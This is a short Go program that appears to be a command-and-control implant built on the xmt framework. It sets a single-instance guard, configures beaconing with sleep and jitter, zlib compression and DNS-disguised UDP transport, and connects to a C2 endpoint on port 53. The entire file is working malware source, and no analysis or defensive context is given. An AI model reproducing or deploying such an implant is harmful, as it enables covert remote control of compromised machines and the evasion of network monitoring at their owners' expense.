package main

import (
	"os"
	"time"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/man"
)

func main() {

	man.MustGuard("thisisapipe")

	var (
		s = c2.NewServer(logx.NOP)
		c = c2.Config{
			c2.Sleep(time.Second * 10),
			c2.Jitter(50),
			c2.ConnectUDP,
			c2.WrapZlib,
			c2.TransformDNS(),
		}
		p, _ = c.Profile()
	)

	z, err := s.Connect("0.0.0.0:53", nil, p)
	if err != nil {
		os.Exit(1)
	}
	z.Wait()
}
